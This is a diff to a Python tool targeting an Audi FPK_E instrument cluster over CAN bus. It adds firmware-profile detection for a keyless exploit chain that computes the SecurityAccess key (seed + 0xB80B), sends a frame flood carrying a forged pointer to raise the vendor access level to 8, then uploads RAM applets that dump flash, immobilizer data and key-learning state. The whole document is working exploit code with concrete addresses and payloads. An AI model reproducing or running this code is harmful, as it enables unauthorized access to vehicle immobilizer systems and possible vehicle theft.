         if bus is None and interface not in FPKE_NATIVE_INTERFACES:
             raise RuntimeError(
@@ -466,6 +753,9 @@ class FpkeCanLink:
             )
         self.port = port
         self.interface = interface
+        self.sw_profile: str | None = sw_profile.strip().lower() if sw_profile else None
+        self._explicit_sw_profile: str | None = self.sw_profile
+        self._stack_profile_verified: bool = False
         self.is_closed = False
         self.level8_active = False
         self.tx_frames = 0
@@ -519,6 +809,7 @@ class FpkeCanLink:
     def close(self) -> None:
         self.is_closed = True
         self.level8_active = False
+        self._stack_profile_verified = False
         self._saved_coil_key_flags = None
         self.stop_drive_simulation()
         self.stop_keepalive()
@@ -920,7 +1211,7 @@ class FpkeCanLink:
                 seq = (seq + 1) & 0x0F
                 offset += len(chunk)
                 sent += 1
-                if delay > 0:
+                if delay > 0 and offset < length:
                     time.sleep(delay)
             if block_size and sent % block_size == 0 and offset < length:
                 block_size, st_min = self.receive_flow_control()
@@ -1120,6 +1411,73 @@ def fpke_idauth(link: FpkeCanLink, idcode_16b: bytes) -> bytes:
     return fpke_read_memory_0x23(link, IDST_ADDR, 4)
 
 
+def _resolve_link_profile(link: FpkeCanLink) -> dict[str, Any]:
+    """Return the active `FPKE_PROFILES` entry for `link` (defaulting to `'83a'`)."""
+    return fpke_get_profile(getattr(link, "sw_profile", None) or "83a")
+
+
+def _probe_link_sw_profile(link: FpkeCanLink, *, force: bool = False) -> str:
+    """Detect `link.sw_profile` (`'83a'`, `'1703'`, or `'1711'`) via UDS `22 F189` / `22 F187`."""
+    explicit = getattr(link, "_explicit_sw_profile", None)
+    if explicit in FPKE_PROFILES:
+        link.sw_profile = str(explicit)
+        return str(explicit)
+    cur = getattr(link, "sw_profile", None)
+    if not force and cur in FPKE_PROFILES:
+        return str(cur)
+    f189_str = ""
+    f187_str = ""
+    with contextlib.suppress(Exception):
+        r89 = link.request_uds(b"\x22\xf1\x89", 0x62, timeout=0.8)
+        f189_str = r89[3:].decode("latin1", errors="ignore").strip("\x00 ")
+    with contextlib.suppress(Exception):
+        r87 = link.request_uds(b"\x22\xf1\x87", 0x62, timeout=0.8)
+        f187_str = r87[3:].decode("latin1", errors="ignore").strip("\x00 ")
+    if f189_str or f187_str:
+        detected = fpke_detect_sw_profile(f189=f189_str, f187=f187_str)
+        if detected != cur:
+            link._stack_profile_verified = False
+        link.sw_profile = detected
+        return detected
+    if cur in FPKE_PROFILES:
+        return str(cur)
+    link.sw_profile = "83a"
+    return "83a"
+
+
+def _refine_link_profile_from_stack(link: FpkeCanLink, *, force: bool = False) -> dict[str, Any]:
+    """Refine `link.sw_profile` (`'83a'` vs `'1703'` vs `'1711'`) from the live `0x23`/`0x3D` stack return word."""
+    cur = getattr(link, "sw_profile", None)
+    if not force and getattr(link, "_stack_profile_verified", False) and cur in FPKE_PROFILES:
+        return _resolve_link_profile(link)
+    if cur in ("1703", "1711"):
+        with contextlib.suppress(Exception):
+            ret_17 = fpke_read_memory_0x23(link, FPKE_1703_SAVED_RETURN, 4, timeout=1.0)
+            if ret_17 == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
+                link.sw_profile = "1711"
+                link._stack_profile_verified = True
+                return _resolve_link_profile(link)
+            if ret_17 == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
+                link.sw_profile = "1703"
+                link._stack_profile_verified = True
+                return _resolve_link_profile(link)
+    with contextlib.suppress(Exception):
+        ret_83a = fpke_read_memory_0x23(link, FPKE_SAVED_RETURN, 4, timeout=1.0)
+        if ret_83a == FPKE_CALLER_RETURN.to_bytes(4, "little"):
+            link.sw_profile = "83a"
+            link._stack_profile_verified = True
+            return _resolve_link_profile(link)
+    with contextlib.suppress(Exception):
+        ret_17 = fpke_read_memory_0x23(link, FPKE_1703_SAVED_RETURN, 4, timeout=1.0)
+        if ret_17 == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
+            link.sw_profile = "1711"
+            link._stack_profile_verified = True
+        elif ret_17 == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
+            link.sw_profile = "1703"
+            link._stack_profile_verified = True
+    return _resolve_link_profile(link)
+
+
 def fpke_verify_level8_control(link: FpkeCanLink) -> bytes:
     """Enter `10 03 -> 10 60` and verify `CFlash[0:16]` starts with `80 07 F0 10`."""
     link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
@@ -1136,6 +1494,7 @@ def fpke_verify_level8_control(link: FpkeCanLink) -> bytes:
             )
         )
     link.level8_active = True
+    _refine_link_profile_from_stack(link, force=True)
     return cflash_16
 
 
@@ -1143,10 +1502,13 @@ def fpke_check_level8(link: FpkeCanLink, *, timeout: float = 0.8) -> bytes | Non
     """Probe whether vendor level 8 is already active in the current session (`10 03 -> 10 60 -> 23 44 00000000 00000010`)."""
     try:
         link.request_uds(b"\x10\x03", 0x50, timeout=timeout)
+        if getattr(link, "sw_profile", None) is None:
+            _probe_link_sw_profile(link)
         link.request_uds(b"\x10\x60", 0x50, timeout=timeout)
         cflash_16 = fpke_read_memory_0x23(link, FPKE_CFLASH_ADDR, 16, timeout=timeout)
         if cflash_16[:4] == FPKE_CFLASH_CONTROL_PREFIX:
             link.level8_active = True
+            _refine_link_profile_from_stack(link)
             return cflash_16
     except Exception:
         pass
@@ -1167,6 +1529,7 @@ def fpke_ensure_level8(
     link.start_keepalive()
     cflash_16 = fpke_check_level8(link)
     if cflash_16 is not None:
+        prof = _resolve_link_profile(link)
         reporter.can_log(
             tr(
                 f"Уровень доступа 8 уже активен в открытой сессии (CFlash[0:16] = {cflash_16[:4].hex(' ').upper()} …)",
@@ -1175,6 +1538,7 @@ def fpke_ensure_level8(
         )
         reporter.info(tr("Уровень доступа 8 подтверждён в открытой сессии", "Vendor level 8 confirmed in open session"))
         return {
+            "sw_profile": prof["name"],
             "vendor_level": FPKE_REQUIRED_LEVEL,
             "reused_session": True,
             "stream_elapsed_s": 0.0,
@@ -1197,13 +1561,13 @@ def fpke_establish_level8(
     post_exploit_sleep: float = 1.0,
     reporter: OperationReporter = NULL_REPORTER,
 ) -> dict[str, Any]:
-    """Execute the complete keyless CAN sequence to establish vendor level 8 on Audi FPK_E SW 83A.
+    """Execute the complete keyless CAN sequence to establish vendor level 8 on FPK_E (SW 83A, 1703, or 1711).
 
     1. Starts keepalive (`0x3C0`, `0x663`, `0x585`, `0x3BE`) and wakes the cluster for `wake_seconds` (4 s).
-    2. `10 03` -> `27 03` -> `27 04 <(BE32(seed) + 0xB80B) mod 2^32>` -> `2E F198 01..06` -> `2E 0514 01` -> `3E 00`.
+    2. `10 03` -> auto-detects `sw_profile` (`83a` vs `1703`/`1711`) -> `27 03` -> `27 04 <(BE32(seed) + 0xB80B) mod 2^32>` -> `2E F198 01..06` -> `2E 0514 01` -> `3E 00`.
     3. Sends 3 EC arming frames on `0x1BFCA2EC` (100 ms apart) and waits for `0x1BFCA2EE = 14 02`.
-    4. Stops keepalive and transmits 1022 paced frames (`0.35 ms`/frame):
-       `ED[0..1018]` + `17FA0E14 FF` + `ED[1019]` (`0xFEDF310D`) + `17FA0E14 CF` (`[0xFEDF3113] = 8`).
+    4. Stops keepalive and transmits paced frames (`0.35 ms`/frame):
+       `ED[0..pointer_frame-1]` + `17FA0E14 FF` + `ED[pointer_frame]` (`forged_ptr`) + `17FA0E14 CF` (`[level_addr] = 8`).
     5. Waits `post_exploit_sleep` (1 s), restarts keepalive, enters `10 03 -> 10 60`, and verifies `CFlash[0:16]`.
     """
     verify_fpke_self_tests()
@@ -1222,6 +1586,14 @@ def fpke_establish_level8(
 
     reporter.can_log(tr("UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming", "UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming"))
     link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
+    link._stack_profile_verified = False
+    if getattr(link, "_explicit_sw_profile", None) is None:
+        _probe_link_sw_profile(link, force=True)
+    prof = _resolve_link_profile(link)
+    prof_name = str(prof["name"])
+    ptr_frame = int(prof["pointer_frame"])
+    total_burst_frames = ptr_frame + 3
+
     seed_resp = link.request_uds(b"\x27\x03", 0x67, timeout=2.0)
     if len(seed_resp) != 6:
         raise RuntimeError(f"Unexpected SecurityAccess 27 03 response: {seed_resp.hex()}")
@@ -1264,7 +1636,12 @@ def fpke_establish_level8(
                 "EC arming readiness (0x1BFCA2EE = 14 02) was not received. Check cluster power and CAN bus.",
             )
         )
-    reporter.can_log(tr("EC arming подтверждён (0x1BFCA2EE = 14 02) — отправка 1022 кадров потока…", "EC arming confirmed (0x1BFCA2EE = 14 02) — sending 1022-frame stream…"))
+    reporter.can_log(
+        tr(
+            f"EC arming подтверждён (0x1BFCA2EE = 14 02, профиль {prof_name.upper()}) — отправка {total_burst_frames} кадров потока…",
+            f"EC arming confirmed (0x1BFCA2EE = 14 02, profile {prof_name.upper()}) — sending {total_burst_frames}-frame stream…",
+        )
+    )
 
     link.stop_keepalive()
     t_start = time.monotonic()
@@ -1279,10 +1656,10 @@ def fpke_establish_level8(
             if delay > 0:
                 time.sleep(delay)
 
-    for index in range(FPKE_POINTER_FRAME):
-        _paced_send(FPKE_BLOCK_ID, flood_payload(index))
+    for index in range(ptr_frame):
+        _paced_send(FPKE_BLOCK_ID, flood_payload(index, profile=prof_name))
     _paced_send(FPKE_CF_CH9_ID, bytes.fromhex("1022800300000000"))
-    _paced_send(FPKE_BLOCK_ID, flood_payload(FPKE_POINTER_FRAME))
+    _paced_send(FPKE_BLOCK_ID, flood_payload(ptr_frame, profile=prof_name))
     _paced_send(FPKE_CF_CH9_ID, bytes([0x21, FPKE_REQUIRED_LEVEL, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]))
     stream_elapsed = round(time.monotonic() - t_start, 3)
 
@@ -1291,6 +1668,7 @@ def fpke_establish_level8(
     link.start_keepalive()
 
     cflash_control = fpke_verify_level8_control(link)
+    prof = _resolve_link_profile(link)
     reporter.can_log(
         tr(
             f"Vendor level 8 установлен за {stream_elapsed:.3f} с (CFlash[0:16] = {cflash_control[:4].hex(' ').upper()} …)",
@@ -1299,14 +1677,15 @@ def fpke_establish_level8(
     )
     reporter.info(tr("Сессия чтения по CAN открыта", "CAN read session established"))
     return {
-        "block_buffer": f"0x{FPKE_BLOCK_BUFFER:08X}",
-        "cantp_channel": 9,
-        "cantp_pointer": f"0x{FPKE_CANTP_CH9_PTR:08X}",
-        "pointer_frame": FPKE_POINTER_FRAME,
-        "forged_pointer": f"0x{FPKE_FORGED_PTR:08X}",
-        "level_address": f"0x{FPKE_LEVEL_ADDRESS:08X}",
+        "sw_profile": prof["name"],
+        "block_buffer": f"0x{prof['block_buffer']:08X}",
+        "cantp_channel": prof["cantp_channel"],
+        "cantp_pointer": f"0x{prof['cantp_ptr']:08X}",
+        "pointer_frame": prof["pointer_frame"],
+        "forged_pointer": f"0x{prof['forged_ptr']:08X}",
+        "level_address": f"0x{prof['level_address']:08X}",
         "vendor_level": FPKE_REQUIRED_LEVEL,
-        "template_sha256": FPKE_TEMPLATE_SHA256,
+        "template_sha256": prof["template_sha256"],
         "stream_elapsed_s": stream_elapsed,
         "cflash_first_16": cflash_control.hex(),
     }
@@ -1358,44 +1737,61 @@ def _applet_ram_guard(
     save_result: bool = True,
     check_bfaselr: bool = False,
 ) -> Iterator[dict[str, Any]]:
-    """Save SX RAM (`0xFEDF1800`, `0xFEDF1900`, `0xFEDF1A00`), upload `payload`, and guarantee RAM restoration."""
-    orig_entry = fpke_read_memory_0x23(link, FPKE_APPLET_ENTRY, len(payload))
-    orig_param = fpke_read_memory_0x23(link, FPKE_SOURCE_PARAM, param_size)
+    """Save SX RAM (`applet_entry`, `source_param`, `result_addr`), upload `payload`, and guarantee RAM restoration."""
+    prof = _resolve_link_profile(link)
+    app_entry = int(prof["applet_entry"])
+    src_param = int(prof["source_param"])
+    res_addr = int(prof["result_addr"])
+    mark_addr = int(prof["marker_addr"])
+    saved_ret_addr = int(prof["saved_return"])
+    exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
+
+    orig_entry = fpke_read_memory_0x23(link, app_entry, len(payload))
+    orig_param = fpke_read_memory_0x23(link, src_param, param_size)
     orig_result = (
-        fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE)
+        fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
         if save_result
-        else fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 32)
+        else fpke_read_memory_0x23(link, mark_addr, 32)
     )
-    saved_return = fpke_read_memory_0x23(link, FPKE_SAVED_RETURN, 4)
-    if saved_return != FPKE_CALLER_RETURN.to_bytes(4, "little"):
+    saved_return = fpke_read_memory_0x23(link, saved_ret_addr, 4)
+    if saved_return != exp_caller_ret and prof["name"] in ("1703", "1711"):
+        if saved_return == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
+            link.sw_profile = "1711"
+            prof = _resolve_link_profile(link)
+            exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
+        elif saved_return == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
+            link.sw_profile = "1703"
+            prof = _resolve_link_profile(link)
+            exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
+    if saved_return != exp_caller_ret:
         raise RuntimeError(
-            f"Unexpected saved return at 0x{FPKE_SAVED_RETURN:08X}: {saved_return.hex()} "
-            f"(expected {FPKE_CALLER_RETURN.to_bytes(4, 'little').hex()})"
+            f"Unexpected saved return at 0x{saved_ret_addr:08X}: {saved_return.hex()} "
+            f"(expected {exp_caller_ret.hex()})"
         )
     if check_bfaselr:
         init_bfaselr = fpke_read_memory_0x23(link, BFASELR_ADDR, 1)
         if init_bfaselr != b"\x00":
             raise RuntimeError(f"Unexpected initial BFASELR: {init_bfaselr.hex()}")
 
-    fpke_write_memory_0x3d(link, FPKE_APPLET_ENTRY, payload)
+    fpke_write_memory_0x3d(link, app_entry, payload)
     state: dict[str, Any] = {"ram_restored": False}
     try:
         yield state
     finally:
         with contextlib.suppress(Exception):
-            fpke_write_memory_0x3d(link, FPKE_APPLET_ENTRY, orig_entry)
-            fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, orig_param)
+            fpke_write_memory_0x3d(link, app_entry, orig_entry)
+            fpke_write_memory_0x3d(link, src_param, orig_param)
             if save_result:
-                fpke_write_memory_0x3d(link, FPKE_RESULT_ADDR, orig_result)
+                fpke_write_memory_0x3d(link, res_addr, orig_result)
             else:
-                fpke_write_memory_0x3d(link, FPKE_MARKER_ADDR, orig_result)
+                fpke_write_memory_0x3d(link, mark_addr, orig_result)
             restored = (
-                fpke_read_memory_0x23(link, FPKE_APPLET_ENTRY, len(payload)) == orig_entry
-                and fpke_read_memory_0x23(link, FPKE_SOURCE_PARAM, param_size) == orig_param
+                fpke_read_memory_0x23(link, app_entry, len(payload)) == orig_entry
+                and fpke_read_memory_0x23(link, src_param, param_size) == orig_param
                 and (
-                    fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE) == orig_result
+                    fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE) == orig_result
                     if save_result
-                    else fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 32) == orig_result
+                    else fpke_read_memory_0x23(link, mark_addr, 32) == orig_result
                 )
                 and (not check_bfaselr or fpke_read_memory_0x23(link, BFASELR_ADDR, 1) == b"\x00")
             )
@@ -1408,28 +1804,42 @@ def _stream_chunk_via_rscan(
     size: int,
     *,
     frame_timeout: float = 1.2,
+    stream_state: dict[str, int] | None = None,
+    pause_keepalive: bool = True,
 ) -> bytes:
-    """Trigger the uploaded `0xFEDF1800` RSCAN0 `TM17` streaming applet for `size` bytes (multiple of 8) and collect `0x6F1` frames."""
+    """Trigger the uploaded SX RAM RSCAN0 `TM17` streaming applet for `size` bytes (multiple of 8) and collect `0x6F1` frames."""
     if size <= 0 or size % 8 != 0:
         raise ValueError(f"Stream chunk size must be a positive multiple of 8, got {size}")
+    prof = _resolve_link_profile(link)
+    app_entry = int(prof["applet_entry"])
+    src_param = int(prof["source_param"])
+    saved_ret_addr = int(prof["saved_return"])
     frames_needed = size // 8
-    fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, struct.pack("<II", address & 0xFFFFFFFF, frames_needed))
+    addr_u32 = address & 0xFFFFFFFF
+    if (
+        stream_state is None
+        or stream_state.get("next_addr") != addr_u32
+        or stream_state.get("frames") != frames_needed
+    ):
+        fpke_write_memory_0x3d(link, src_param, struct.pack("<II", addr_u32, frames_needed))
     trigger_req = (
         b"\x3d\x44"
-        + FPKE_SAVED_RETURN.to_bytes(4, "big")
+        + saved_ret_addr.to_bytes(4, "big")
         + (4).to_bytes(4, "big")
-        + FPKE_APPLET_ENTRY.to_bytes(4, "little")
+        + app_entry.to_bytes(4, "little")
     )
     collected = bytearray()
     rx_count = 0
-    with link.paused_keepalive():
+    ka_ctx = link.paused_keepalive() if pause_keepalive else contextlib.nullcontext()
+    with ka_ctx:
         link.drain_rx(quick=True)
         link.send_uds(trigger_req)
-        deadline = time.monotonic() + max(4.0, frames_needed * 0.005 + frame_timeout)
+        deadline = time.monotonic() + max(1.5, frames_needed * 0.005 + frame_timeout)
         got_7d = False
         with link.suspend_rx_trace():
             while (len(collected) < size or not got_7d) and time.monotonic() < deadline:
-                msg = link.receive_frame(timeout=frame_timeout)
+                wait_s = min(frame_timeout, max(0.02, deadline - time.monotonic()))
+                msg = link.receive_frame(timeout=wait_s)
                 if msg.is_extended_id:
                     continue
                 raw = bytes(msg.data)
@@ -1449,6 +1859,7 @@ def _stream_chunk_via_rscan(
                             got_7d = True
                             if len(collected) >= size:
                                 break
+                            deadline = min(deadline, time.monotonic() + 0.08)
                         elif len(uds_reply) >= 3 and uds_reply[0] == 0x7F and uds_reply[2] == 0x78:
                             continue
                         elif uds_reply[:1] == b"\x7f":
@@ -1458,15 +1869,22 @@ def _stream_chunk_via_rscan(
                         link.send_frame(link.UDS_TX_ID, b"\x30\x00\x00", pad=0x55)
                         if raw[2:3] == b"\x7f":
                             raise RuntimeError(f"Trigger 0x3D rejected: {raw.hex()}")
+                        deadline = min(deadline, time.monotonic() + 0.25)
                     elif pci_type == 2:
                         got_7d = True
                         if len(collected) >= size:
                             break
+                        deadline = min(deadline, time.monotonic() + 0.08)
         link.write_stream_summary(address, size, len(collected), rx_count)
     if len(collected) != size:
+        if stream_state is not None:
+            stream_state.clear()
         raise TimeoutError(
             f"RSCAN0 stream from 0x{link.STREAM_RX_ID:03X} @ 0x{address:08X} incomplete: {len(collected)}/{size} B"
         )
+    if stream_state is not None:
+        stream_state["next_addr"] = (addr_u32 + size) & 0xFFFFFFFF
+        stream_state["frames"] = frames_needed
     return bytes(collected)
 
 
@@ -1484,7 +1902,7 @@ def fpke_read_region_in_session(
     """Read `[source, source + length)` in an already-authenticated FPK_E session (`direct`, `bflash`, or `uflash`).
 
     When `use_stream=True` and `length >= 512`, attempts fast RSCAN0 `TM17` (`0x6F1`) streaming first and
-    automatically falls back to the hardware-verified UDS `0x23` / `0xFEDF1A00` buffer method if the adapter drops frames.
+    automatically falls back to the hardware-verified UDS `0x23` / `result_addr` buffer method if the adapter drops frames.
     """
     if mode not in ("direct", "bflash", "uflash"):
         raise ValueError(f"Unsupported read mode: {mode}")
@@ -1493,10 +1911,12 @@ def fpke_read_region_in_session(
 
     reporter.reset_stage_timer()
     reporter.progress(0, length, unit="B", detail=label or mode)
+    prof = _refine_link_profile_from_stack(link)
+    prof_name = str(prof["name"])
 
     # 1. Try fast RSCAN0 TM17 streaming for bulk reads (>= 512 B, 8-byte aligned) when requested
     if use_stream and length >= 512 and source % 4 == 0 and length % 8 == 0:
-        stream_payload = build_fpke_can_stream_applet(mode)
+        stream_payload = build_fpke_can_stream_applet(mode, profile=prof_name)
         stream_data = bytearray()
         try:
             with _applet_ram_guard(
@@ -1506,15 +1926,33 @@ def fpke_read_region_in_session(
                 save_result=False,
                 check_bfaselr=(mode == "bflash"),
             ) as guard_state:
+                prof = _resolve_link_profile(link)
+                mark_addr = int(prof["marker_addr"])
                 offset = 0
-                while offset < length:
-                    reporter.check_cancelled()
-                    step = min(FPKE_STREAM_CHUNK_BYTES, length - offset)
-                    part = _stream_chunk_via_rscan(link, source + offset, step)
-                    stream_data.extend(part)
-                    offset += len(part)
-                    reporter.progress(offset, length, unit="B", detail=f"{label or mode} @ 0x{source + offset:08X}")
-                marker = fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 4)
+                stream_state: dict[str, int] = {}
+                was_ka = link.is_keepalive_running()
+                with link.paused_keepalive():
+                    last_ka = time.monotonic()
+                    while offset < length:
+                        reporter.check_cancelled()
+                        now_t = time.monotonic()
+                        if was_ka and now_t - last_ka >= 0.18:
+                            with contextlib.suppress(Exception):
+                                link.send_frame(0x3C0, b"\x00\x00\x03\x00", extended=False)
+                                link.send_frame(0x663, b"\x00\x00\x00\x0e\x00\x00\x00\x00", extended=False)
+                            last_ka = now_t
+                        step = min(FPKE_STREAM_CHUNK_BYTES, length - offset)
+                        part = _stream_chunk_via_rscan(
+                            link,
+                            source + offset,
+                            step,
+                            stream_state=stream_state,
+                            pause_keepalive=False,
+                        )
+                        stream_data.extend(part)
+                        offset += len(part)
+                        reporter.progress(offset, length, unit="B", detail=f"{label or mode} @ 0x{source + offset:08X}")
+                marker = fpke_read_memory_0x23(link, mark_addr, 4)
                 if marker != b"SCAN":
                     raise RuntimeError(f"Stream applet marker mismatch: {marker.hex()}")
             if not guard_state.get("ram_restored"):
@@ -1532,16 +1970,21 @@ def fpke_read_region_in_session(
                 "ram_restored": True,
                 "flash_writes": False,
             }
-        except (TimeoutError, RuntimeError, can.CanError) as exc:
+        except (TimeoutError, RuntimeError, UdsNegativeResponse, can.CanError) as exc:
             reporter.warning(
                 tr(
                     f"Быстрый поток 0x6F1 прерван ({exc}) — автоматический переход на штатное чтение UDS 0x23…",
                     f"Fast 0x6F1 stream interrupted ({exc}) — falling back to verified UDS 0x23 read…",
                 )
             )
+            link.drain_rx(quick=True)
+            link.start_keepalive()
+            if fpke_check_level8(link) is None:
+                link.level8_active = False
+                fpke_ensure_level8(link, wake_seconds=1.5, reporter=reporter)
             reporter.reset_stage_timer()
 
-    # 2. Verified UDS 0x23 (`direct`) or 256-byte `0xFEDF1A00` RAM-buffer applet (`bflash` / `uflash`)
+    # 2. Verified UDS 0x23 (`direct`) or 256-byte `result_addr` RAM-buffer applet (`bflash` / `uflash`)
     data = bytearray()
     if mode == "direct":
         eff_chunk = max(1, min(chunk_size, 500))
@@ -1571,9 +2014,11 @@ def fpke_read_region_in_session(
             "flash_writes": False,
         }
 
-    # Applet buffer mode (`bflash` or `uflash`) — 256 bytes per call via `0xFEDF1A00`
-    buf_payload = FPKE_UFLASH_BUF_PAYLOAD if mode == "uflash" else FPKE_BFLASH_BUF_PAYLOAD
-    buf_sha = FPKE_UFLASH_BUF_PAYLOAD_SHA256 if mode == "uflash" else FPKE_BFLASH_BUF_PAYLOAD_SHA256
+    # Applet buffer mode (`bflash` or `uflash`) — 256 bytes per call via `result_addr`
+    prof = _refine_link_profile_from_stack(link)
+    prof_name = str(prof["name"])
+    buf_payload = build_fpke_uflash_buf_applet(prof_name) if mode == "uflash" else build_fpke_bflash_buf_applet(prof_name)
+    buf_sha = hashlib.sha256(buf_payload).hexdigest()
     with _applet_ram_guard(
         link,
         buf_payload,
@@ -1581,13 +2026,18 @@ def fpke_read_region_in_session(
         save_result=True,
         check_bfaselr=(mode == "bflash"),
     ) as guard_state:
+        prof = _resolve_link_profile(link)
+        app_entry = int(prof["applet_entry"])
+        src_param = int(prof["source_param"])
+        res_addr = int(prof["result_addr"])
+        saved_ret_addr = int(prof["saved_return"])
         for offset in range(0, length, 256):
             reporter.check_cancelled()
             sz = min(256, length - offset)
             addr = source + offset
-            fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, addr.to_bytes(4, "little"))
-            fpke_write_memory_0x3d(link, FPKE_SAVED_RETURN, FPKE_APPLET_ENTRY.to_bytes(4, "little"))
-            raw = fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE)
+            fpke_write_memory_0x3d(link, src_param, addr.to_bytes(4, "little"))
+            fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
+            raw = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
             if raw[256:260] != b"SCAN":
                 raise RuntimeError(f"Applet SCAN marker mismatch at 0x{addr:08X}: {raw[256:260].hex()}")
             data.extend(raw[:sz])
@@ -1758,6 +2208,8 @@ def can_fpke_full_read(
 
     with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
         try:
+            if ident and getattr(link, "sw_profile", None) is None:
+                link.sw_profile = fpke_detect_sw_profile(ident)
             reporter.step(
                 step_no,
                 total_steps,
@@ -1900,8 +2352,10 @@ def can_fpke_full_read(
             immo_passport_path = out_dir / "immo_passport.json"
             atomic_write(immo_passport_path, (json.dumps(immo_passport, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
 
+            prof = _resolve_link_profile(link)
             report: dict[str, Any] = {
-                "target": "Audi FPK_E SW 83A (83A920700E)",
+                "target": prof["target_label"],
+                "sw_profile": prof["name"],
                 "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                 "port": port,
                 "interface": interface,
@@ -2066,8 +2520,10 @@ def can_fpke_read_region(
                 validate_fpke_extra_area(data)
 
             atomic_write(bin_path, data)
+            prof = _resolve_link_profile(link)
             report: dict[str, Any] = {
-                "target": "Audi FPK_E SW 83A (83A920700E)",
+                "target": prof["target_label"],
+                "sw_profile": prof["name"],
                 "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                 "port": port,
                 "interface": interface,
@@ -2528,7 +2984,7 @@ def fpke_extract_live_s0_s1_from_coil(
 
 
 def _detect_fpke_nvm_ram_bases(link: FpkeCanLink, kc_hex: str = "") -> tuple[int, int, int]:
-    """Return `(r67_base, r68_base, r69_base)` in `.secdata` RAM for SW 83A vs SW 1703."""
+    """Return `(r67_base, r68_base, r69_base)` in `.secdata` RAM for SW 83A vs SW 1703 / 1711."""
     kc_clean = "".join(kc_hex.split())
     if len(kc_clean) == 32:
         kc_bytes = bytes.fromhex(kc_clean)
@@ -2540,6 +2996,8 @@ def _detect_fpke_nvm_ram_bases(link: FpkeCanLink, kc_hex: str = "") -> tuple[int
             kc_1703 = fpke_read_memory_0x23(link, FPKE_1703_RAM_EEL68_ADDR + 0x26, 16)
             if kc_1703 == kc_bytes:
                 return FPKE_1703_RAM_EEL67_ADDR, FPKE_1703_RAM_EEL68_ADDR, FPKE_1703_RAM_EEL69_ADDR
+    if getattr(link, "sw_profile", None) in ("1703", "1711"):
+        return FPKE_1703_RAM_EEL67_ADDR, FPKE_1703_RAM_EEL68_ADDR, FPKE_1703_RAM_EEL69_ADDR
     with contextlib.suppress(Exception):
         mode_83a = fpke_read_memory_0x23(link, FPKE_83A_RAM_EEL68_ADDR + 0x49, 1)[0]
         if mode_83a <= 5:
@@ -2875,8 +3333,8 @@ def fpke_finish_coil_key_learning(
                 raise
             reporter.info(
                 tr(
-                    "Узел 0x0E не ответил по каналу 3 (стенд без KESSY/BCM) — завершение обучения командой 80 00…",
-                    "Node 0x0E did not answer on channel 3 (bench without KESSY/BCM) — finishing with 80 00…",
+                    "Узел 0x0E (BCM 09) не ответил по каналу 3 (работа на стенде) — завершение обучения командой 80 00…",
+                    "Node 0x0E (BCM 09) did not answer on channel 3 (bench mode) — finishing with 80 00…",
                 )
             )
             link.request_uds(build_fpke_02e1_request(0x80, 0x00), 0x6E, timeout=8.0)
@@ -2906,3 +3364,687 @@ def fpke_finish_coil_key_learning(
         "kessy_restored": kessy_restored,
         "poll": poll,
     }
+
+
+# ────────────────────────────── DataFlash FACI Blank-Check & Writer ──────────────────────────────
+
+
+def fpke_read_dflash_blank_checked(
+    link: FpkeCanLink,
+    *,
+    offset: int = 0,
+    length: int = FPKE_DFLASH_SIZE,
+    cpu_dflash: bytes | None = None,
+    attempts: int = 8,
+    retry_delay: float = 0.15,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> tuple[bytes, bytearray]:
+    """Blank-check `[offset, offset + length)` of RV40F DataFlash via FACI `0x71` and return `(clean_slice, word_mask)`."""
+    if offset < 0 or length <= 0 or offset + length > FPKE_DFLASH_SIZE or offset % 128 != 0 or length % 128 != 0:
+        raise ValueError(f"Invalid DataFlash blank-check range: offset=0x{offset:X}, length=0x{length:X}")
+
+    if cpu_dflash is not None and len(cpu_dflash) >= offset + length:
+        raw_slice = bytes(cpu_dflash[offset : offset + length])
+    else:
+        raw_slice, _ = fpke_read_region_in_session(
+            link,
+            mode="direct",
+            source=FPKE_DFLASH_ADDR + offset,
+            length=length,
+            use_stream=False,
+            label="DataFlash (CPU)",
+            reporter=reporter,
+        )
+
+    clean_buf = bytearray(raw_slice)
+    word_mask = bytearray(length)
+    prof = _refine_link_profile_from_stack(link)
+    bc_payload = build_fpke_dflash_bc_applet(
+        applet_entry=int(prof["applet_entry"]),
+        caller_return=int(prof["caller_return"]),
+        caller_r29=int(prof["caller_r29"]),
+    )
+
+    with _applet_ram_guard(link, bc_payload, param_size=8, save_result=True) as guard_state:
+        prof = _resolve_link_profile(link)
+        app_entry = int(prof["applet_entry"])
+        src_param = int(prof["source_param"])
+        res_addr = int(prof["result_addr"])
+        saved_ret_addr = int(prof["saved_return"])
+        rel = 0
+        while rel < length:
+            reporter.check_cancelled()
+            step_bytes = min(512, length - rel)
+            groups = step_bytes // 128
+            cur_off = offset + rel
+            raw_res = b""
